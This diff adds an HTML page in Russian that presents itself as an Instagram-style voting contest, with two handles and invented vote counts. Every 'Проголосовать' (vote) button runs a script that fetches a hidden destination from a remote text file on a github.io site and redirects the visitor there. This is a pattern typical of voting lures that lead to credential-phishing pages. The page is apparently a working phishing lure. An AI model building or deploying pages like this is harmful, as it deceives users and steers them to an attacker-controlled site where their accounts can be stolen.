@@ -1,1 +1,107 @@
-<h1>hi</h1>
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Голосование</title>
+    <link rel="icon" type="image/x-icon" href="battle.png">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Arial", sans-serif;
+      background-color: #0f0f23;
+      color: white;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 20px;
+      padding: 20px;
+      color: #caa7ff;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      padding: 10px;
+    }
+
+    .card {
+      background-color: #1a1a2e;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+    }
+
+    .avatar {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-bottom: 10px;
+    }
+
+    .name {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    .votes {
+      font-size: 14px;
+      color: #aaa;
+      margin-bottom: 10px;
+    }
+
+    .vote-button {
+      padding: 10px 20px;
+      background-color: #9b59b6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .vote-button:hover {
+      background-color: #8e44ad;
+    }
+  </style>
+ 
+</head>
+<body>
+  <h1>Выберите участника, которому вы хотели бы отдать свой голос 🥳🥳</h1>
+
+  <div class="container">
+    <div class="card">
+      <img src="trade.jpg" alt="Надежда Новицкая" class="avatar">
+      <div class="name">@babadzhanov___</div>
+      <div class="votes">173 голоса</div>
+      <button onclick="test('trade')" class="vote-button">Проголосовать</button>
+    </div>
+
+    <div class="card">
+      <img src="vorzakon.jpg" alt="Александра Лазарева" class="avatar">
+      <div class="name">@77.emir.i</div>
+      <div class="votes">197 голосов</div>
+      <button onclick="test('sari')" class="vote-button">Проголосовать</button>
+    </div>
+  </div>
+</body>
+<script>
+  
+
+    function test(s){
+        var request='https://dcseroot.github.io/instabatl/link.txt'
+        fetch(request).then((response) => {
+    response.text().then((data) => {
+      window.location=data;
+    });
+});
+    }
+   
+</script>
+</html>
